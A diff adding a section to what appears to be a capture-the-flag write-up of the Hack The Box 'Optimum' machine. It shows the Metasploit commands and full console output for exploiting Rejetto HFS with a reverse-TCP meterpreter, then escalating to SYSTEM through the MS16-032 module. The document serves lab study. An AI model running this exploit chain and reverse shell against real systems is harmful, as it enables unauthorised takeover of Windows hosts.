@@ -94,3 +94,113 @@ I got the user flag.
 
 
 
+I could not figure out how to get Admin privileges on Windows , so I watched IppSec's video. Using Metasploit, the payload has to be windows/x64/meterpreter/reverse_tcp.
+
+```
+msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
+```
+
+Now when I set all the options correctly (RHOST, LHOST, LPORT, SRVHOST), I see a meterpreter shell. 
+
+```
+meterpreter > ls
+Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2020-09-30 23:55:52 -0700  %TEMP%
+100666/rw-rw-rw-  282     fil   2017-03-18 04:57:16 -0700  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 03:58:52 -0800  hfs.exe
+100444/r--r--r--  32      fil   2017-03-18 05:13:18 -0700  user.txt.txt
+
+meterpreter > cat user.txt.txt
+
+```
+
+Background this session by pressing ctrl+z, and search for suggester. We find that metasploit has a post-exploitation module for privilege escalation - post/multi/recon/local_exploit_suggester.
+
+Trying the following module worked:
+
+```
+msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+```
+
+And then, running it and getting a shell, then browsing to get the flags.
+
+```
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.10:4445 
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\jZMymPNyo.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3596
+[*] Executing exploit script...
+	 __ __ ___ ___   ___     ___ ___ ___ 
+	|  V  |  _|_  | |  _|___|   |_  |_  |
+	|     |_  |_| |_| . |___| | |_  |  _|
+	|_|_|_|___|_____|___|   |___|___|___|
+	                                    
+	               [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1396
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 1392
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+BySH70KSJjNuhCbmW3OonNOYrqTAo0RX
+[+] Executed on target machine.
+[*] Sending stage (176195 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.10:4445 -> 10.10.10.8:49164) at 2020-09-24 15:05:47 -0700
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\jZMymPNyo.ps1
+
+meterpreter > ls
+Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2020-09-30 23:55:52 -0700  %TEMP%
+100666/rw-rw-rw-  282     fil   2017-03-18 04:57:16 -0700  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 03:58:52 -0800  hfs.exe
+100444/r--r--r--  32      fil   2017-03-18 05:13:18 -0700  user.txt.txt
+
+meterpreter > sysinfo
+Computer        : OPTIMUM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 3
+Meterpreter     : x86/windows
+meterpreter > whoami
+[-] Unknown command: whoami.
+meterpreter > shell
+Process 1876 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>whoami
+whoami
+nt authority\system
+
+```
+
